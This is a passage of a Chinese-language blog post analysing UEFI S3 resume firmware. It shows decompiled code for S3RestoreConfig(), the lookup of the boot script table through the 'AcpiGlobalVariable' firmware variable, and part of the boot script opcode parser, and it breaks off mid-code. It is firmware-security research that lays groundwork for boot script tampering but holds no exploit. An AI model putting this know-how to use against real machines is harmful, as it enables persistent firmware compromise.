<li>其他需要的信息<br>所有这些必要的信息都应该由<code>EFI_ACPI_S3_SAVE_PROTOCOL.S3Save()</code>函数在正常引导路径上准备好。然后，<code>S3RestoreConfig()</code>函数通过调用来执行预先存储的引导脚本表<br><code>EFI_PEI_BOOT_SCRIPT_EXECUTER_PPI.Execute()</code>，并将平台转换到预引导状态。最后，这个函数将控制权交给操作系统的唤醒向量。如果操作系统只支持实模式(real mode)的唤醒向量，这个函数将从flat模式切换到实模式，然后跳转到唤醒向量。</li>
</ul>
<p>下面是<code>S3RestoreConfig()</code>的反汇编代码，为了让它更简单，我跳过了很多不属于引导脚本表处理的东西：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS __cdecl <span class="title function_">S3RestoreConfig</span><span class="params">(EFI_PEI_SERVICES **ppPeiServices)</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS Result;</span><br><span class="line">  EFI_STATUS Status;  </span><br><span class="line">  EFI_PEI_BOOT_SCRIPT_EXECUTER_PPI *pBootScriptExecuter;</span><br><span class="line">  <span class="type">int</span> AcpiGlobalVariable;</span><br><span class="line">  __int64 pBootScript;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  EFI_PEI_SERVICES *pPeiServices = *ppPeiServices;</span><br><span class="line">  pPeiServices-&gt;ReportStatusCode(ppPeiServices, <span class="number">1</span>, <span class="number">0x3038000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取引导脚本执行器的 PPI</span></span><br><span class="line">  Status = (*ppPeiServices)-&gt;LocatePpi(</span><br><span class="line">    ppPeiServices, &amp;gEfiPeiBootScriptExecuterPpiGuid, <span class="number">0</span>, <span class="number">0</span>, &amp;pBootScriptExecuter</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">if</span> (Status &amp; <span class="number">0x80000000</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    (*ppPeiServices)-&gt;ReportStatusCode(ppPeiServices, <span class="number">0x80000002</span>u, <span class="number">0x3038006</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Result = Status;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取ACPI全局变量地址</span></span><br><span class="line">    AcpiGlobalVariable = sub_FFBB550D(ppPeiServices);</span><br><span class="line">    AcpiGlobalVariable_ = AcpiGlobalVariable;</span><br><span class="line">    <span class="keyword">if</span> (AcpiGlobalVariable)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 获取引导脚本表地址</span></span><br><span class="line">      v5 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(AcpiGlobalVariable + <span class="number">0x18</span>);</span><br><span class="line">      HIDWORD(pBootScript) = *(<span class="type">unsigned</span> <span class="type">int</span> *)(AcpiGlobalVariable + <span class="number">0x1C</span>);</span><br><span class="line">      LODWORD(pBootScript) = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      pPeiServices-&gt;ReportStatusCode(ppPeiServices_, <span class="number">1</span>, <span class="number">0x3038001</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 执行引导脚本表</span></span><br><span class="line">      <span class="keyword">if</span> (pBootScriptExecuter-&gt;Execute(</span><br><span class="line">        ppPeiServices, pBootScriptExecuter, pBootScript, HIDWORD(pBootScript), <span class="number">0</span>) &amp; <span class="number">0x80000000</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        (*ppPeiServices)-&gt;ReportStatusCode(ppPeiServices, <span class="number">0x80000002</span>u, <span class="number">0x3038006</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// ... skipped the rest part of S3 resume code ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Result = <span class="number">0x80000003</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*ppPeiServices)-&gt;ReportStatusCode(ppPeiServices, <span class="number">0x80000002</span>u, <span class="number">0x3038008</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Result = <span class="number">0x8000000E</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>这个函数在ACPI全局变量结构体开始处的0x18偏移处获取引导脚本表的地址，然后调用另一个PPI(位于同一个PEIM中，在入口点执行的早期被注册)来执行引导脚本代码。<code>sub_FFBB550D()</code>函数定位ACPI全局变量的地址，从GUID为<code>af9ffd67-ec10-488a-9dfc-6cbf5ee22c2e</code>的4字节固件变量中读取：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_FFBB550D</span><span class="params">(EFI_PEI_SERVICES **ppPeiServices)</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_PEI_SERVICES *pPeiServices = *ppPeiServices;</span><br><span class="line">  EFI_PEI_READ_ONLY_VARIABLE2_PPI *pReadOnlyVariable2;</span><br><span class="line">  EFI_STATUS Status;</span><br><span class="line">  <span class="type">int</span> v4 = <span class="number">4</span>; </span><br><span class="line">  <span class="type">int</span> v5 = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定位EFI变量的PPI</span></span><br><span class="line">  pPeiServices-&gt;LocatePpi(</span><br><span class="line">    ppPeiServices, &amp;gEfiPeiReadOnlyVariable2PpiGuid, <span class="number">0</span>, <span class="number">0</span>, &amp;pReadOnlyVariable2</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 查询变量值</span></span><br><span class="line">  Status = pReadOnlyVariable2-&gt;GetVariable(</span><br><span class="line">    pReadOnlyVariable2, <span class="string">L&quot;AcpiGlobalVariable&quot;</span>, &amp;gAcpiGlobalVariableGuid, <span class="number">0</span>, &amp;v4, &amp;v5</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (Status &amp; <span class="number">0x80000000</span>) == <span class="number">0</span> ? v5 : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>现在，当已知当前引导脚本表地址的位置时，可以使用CHIPSEC框架转储它(稍后将介绍这个工具)。<br>boot script 的前0xD0字节包含以下内容:</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162331163.png" alt="image-20230809162331163"></p>
<p>图中高亮显示了一些表项中可识别的字段：红色——表项索引，绿色——表项字节大小，蓝色——操作码。现在我们可以看到，与EDK2源代码中引导脚本表的参考实现相比，给定的boot script格式是非常不同的（查看<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/dfa51bb619b455315a0476d0f2335da41268a2a2/EdkCompatibilityPkg/Foundation/Framework/Include/EfiBootScript.h">EfiBootScript.h</a>和<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/tree/997a5d1b049beb6af2ed40195b0b1c8aaf3bd555/MdeModulePkg/Library/PiDxeS3BootScriptLib">PiDxeS3BootScriptLib</a>）。<br>下面是<code> EFI_PEI_BOOT_SCRIPT_EXECUTER_PPI.Execute()</code>函数 实现引导脚本表解析并执行的反编译代码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">EFI_STATUS __cdecl <span class="title function_">Execute</span><span class="params">(EFI_PEI_SERVICES **ppPeiServices,</span></span><br><span class="line"><span class="params">                           EFI_PEI_BOOT_SCRIPT_EXECUTER_PPI *This,</span></span><br><span class="line"><span class="params">                           __int64 Address, <span class="type">int</span> FvFile)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> InstructionPtr;</span><br><span class="line">  EFI_STATUS Result;</span><br><span class="line">  EFI_STATUS Opcode;</span><br><span class="line">  EFI_PEI_SERVICES *pPeiServices;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将由ParseInstruction()调用设置的堆栈参数</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// [bp-64h]@10</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [bp-5Eh]@70</span></span><br><span class="line">  __int64 v34; <span class="comment">// [bp-5Ch]@11</span></span><br><span class="line">  __int64 v35; <span class="comment">// [bp-54h]@15</span></span><br><span class="line">  __int64 v36; <span class="comment">// [bp-4Ch]@17</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// [bp-44h]@23</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// [bp-40h]@23</span></span><br><span class="line"></span><br><span class="line">  EFI_PEI_SMBUS2_PPI *pSmbus2;</span><br><span class="line">  EFI_PEI_STALL_PPI *pStall;</span><br><span class="line">  EFI_PEI_CPU_IO_PPI *pCpuIo;</span><br><span class="line">  EFI_PEI_PCI_CFG_PPI *pPciCfg;</span><br><span class="line"></span><br><span class="line">  EFI_PEI_PCI_CFG_PPI *pPciCfg_;</span><br><span class="line">  EFI_PEI_PCI_CFG_PPI *pPciCfg__;</span><br><span class="line"></span><br><span class="line">  InstructionPtr = Address;</span><br><span class="line">  v49 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FvFile)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000003</span>u;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!Address)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000002</span>u;</span><br><span class="line"></span><br><span class="line">  pCpuIo = (EFI_PEI_CPU_IO_PPI *)(*ppPeiServices)-&gt;CpuIo;</span><br><span class="line">  pPciCfg = (EFI_PEI_PCI_CFG_PPI *)(*ppPeiServices)-&gt;PciCfg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((*ppPeiServices)-&gt;LocatePpi(ppPeiServices, &amp;gEfiPeiSmbus2PpiGuid, <span class="number">0</span>, <span class="number">0</span>, &amp;pSmbus2) &amp; <span class="number">0x80000000</span> ||</span><br><span class="line">      (*ppPeiServices)-&gt;LocatePpi(ppPeiServices, &amp;gEfiPeiStallPpiGuid, <span class="number">0</span>, <span class="number">0</span>, &amp;pStall) &amp; <span class="number">0x80000000</span>)</span><br><span class="line">    <span class="keyword">goto</span> LABEL_97;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">   </span><br><span class="line">    InstructionPtr += <span class="number">8</span>;</span><br><span class="line">    Opcode = *(<span class="type">unsigned</span> <span class="type">char</span> *)InstructionPtr;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (Opcode &lt;= <span class="number">128</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (Opcode != <span class="number">128</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> (Opcode)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_IO_WRITE_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x10</span>u);</span><br><span class="line">            v7 = InstructionPtr + <span class="number">16</span>;</span><br><span class="line">            v8 = v7;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> __int8)(BYTE1(v32) &amp; <span class="number">0xFC</span>) == <span class="number">4</span>)</span><br><span class="line">              v9 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v9 = v34;</span><br><span class="line">            InstructionPtr = v9 * (<span class="type">unsigned</span> __int8)(<span class="number">1</span> &lt;&lt; (BYTE1(v32) &amp; <span class="number">3</span>)) + v7;</span><br><span class="line">            pCpuIo-&gt;IoRead16(ppPeiServices, pCpuIo, BYTE1(v32), HIWORD(v32), <span class="number">0</span>, v34, v8);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x18</span>u);</span><br><span class="line">            v10 = BYTE1(v32) &amp; <span class="number">3</span>;</span><br><span class="line">            InstructionPtr += <span class="number">24</span>;</span><br><span class="line">            pCpuIo-&gt;IoRead8(ppPeiServices, pCpuIo, BYTE1(v32) &amp; <span class="number">3</span>, HIWORD(v32), <span class="number">0</span>, <span class="number">1</span>, &amp;v42);</span><br><span class="line">            v42 = v34 | v42 &amp; v35;</span><br><span class="line">            pCpuIo-&gt;IoRead16(ppPeiServices, pCpuIo, v10, HIWORD(v32), <span class="number">0</span>, <span class="number">1</span>, &amp;v42);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// vendor-specific opcode?</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x20</span>u);</span><br><span class="line">            InstructionPtr += <span class="number">32</span>;</span><br><span class="line">            LODWORD(v11) = sub_FFBB5DE3(v36, HIDWORD(v36), <span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">            v41 = v11 + <span class="number">1</span>;</span><br><span class="line">            v49 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_78;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x18</span>u);</span><br><span class="line">            v12 = InstructionPtr + <span class="number">24</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> __int8)(BYTE1(v32) &amp; <span class="number">0xFC</span>) == <span class="number">4</span>)</span><br><span class="line">              v13 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v13 = v35;</span><br><span class="line">            v14 = v12;</span><br><span class="line">            InstructionPtr = v13 * (<span class="type">unsigned</span> __int8)(<span class="number">1</span> &lt;&lt; (BYTE1(v32) &amp; <span class="number">3</span>)) + v12;</span><br><span class="line">            pCpuIo-&gt;Io(ppPeiServices, pCpuIo, BYTE1(v32), v34, HIDWORD(v34), v35, v14);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_MEM_READ_WRITE_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x20</span>u);</span><br><span class="line">            v15 = BYTE1(v32) &amp; <span class="number">3</span>;</span><br><span class="line">            InstructionPtr += <span class="number">32</span>;</span><br><span class="line">            pCpuIo-&gt;Mem(ppPeiServices, pCpuIo, BYTE1(v32) &amp; <span class="number">3</span>, v34, HIDWORD(v34), <span class="number">1</span>, &amp;v42);</span><br><span class="line">            v42 = v35 | v42 &amp; v36;</span><br><span class="line">            pCpuIo-&gt;Io(ppPeiServices, pCpuIo, v15, v34, HIDWORD(v34), <span class="number">1</span>, &amp;v42);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// vendor-specific opcode?</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x28</span>u);</span><br><span class="line">            InstructionPtr += <span class="number">40</span>;</span><br><span class="line">            LODWORD(v16) = sub_FFBB5DE3(v37, v38, <span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">            v41 = v16 + <span class="number">1</span>;</span><br><span class="line">            v49 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_90;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_PCI_CONFIG2_WRITE_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x20</span>u);</span><br><span class="line">            InstructionPtr += <span class="number">32</span>;</span><br><span class="line">            <span class="keyword">if</span> (v36)</span><br><span class="line">              pPciCfg = (EFI_PEI_PCI_CFG_PPI *)sub_FFBB557D(ppPeiServices, v36);</span><br><span class="line">            <span class="keyword">if</span> (!pPciCfg)</span><br><span class="line">              <span class="keyword">goto</span> LABEL_97;</span><br><span class="line">            v49 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_28;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span 